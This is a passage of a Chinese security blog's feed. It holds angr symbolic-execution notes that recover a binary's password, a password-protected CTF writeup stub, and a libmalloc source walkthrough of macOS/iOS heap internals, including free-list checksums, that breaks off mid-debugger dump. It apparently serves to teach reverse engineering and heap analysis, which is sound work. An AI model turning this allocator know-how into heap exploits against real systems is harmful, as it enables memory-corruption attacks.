0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 